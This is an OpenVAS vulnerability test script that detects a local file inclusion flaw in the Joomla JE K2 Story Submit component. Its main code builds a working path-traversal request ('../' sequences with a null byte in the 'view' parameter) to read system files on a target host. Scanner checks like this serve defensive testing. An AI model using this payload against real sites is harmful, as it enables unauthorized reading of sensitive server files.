##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_jek2_lfi_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Joomla Component JE K2 Story Submit Local File Inclusion Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to obtain sensitive information
  that could aid in further attacks.
  Impact Level: Application.";
tag_affected = "Joomla Component JE Story submit.";
tag_insight = "The flaw is caused by improper validation of user-supplied input via the
  'view' parameter in 'index.php', which allows attackers to read arbitrary
  files via a ../(dot dot) sequences.";
tag_solution = "No solution or patch is available as of 22nd July 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to
  http://joomlaextensions.co.in/extensions/components/je-story-submit.html";
tag_summary = "This host is running Joomla component JE K2 Story Submit and is
  prone to local file inclusion vulnerability.";

if(description)
{
  script_id(902542);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-27 09:16:39 +0200 (Wed, 27 Jul 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Joomla Component JE K2 Story Submit Local File Inclusion Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17556/");

  script_description(desc);
  script_summary("Check if Joomla CMS is vulnerable to local file inclusion");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Get Joomla Directory
if(!dir = get_dir_from_kb(port:port,app:"joomla")) {
  exit(0);
}

files = traversal_files();

foreach file (keys(files))
{
  ## Construct attack request
  url = string(dir, "/index.php?option=com_jesubmit&view=",
               crap(data:"/..",length:31), files[file], "%00");

  ## Try exploit and check the response to confirm vulnerability
  if(http_vuln_check(port:port, url:url, pattern:file)) {
    security_warning(port:port);
  }
}
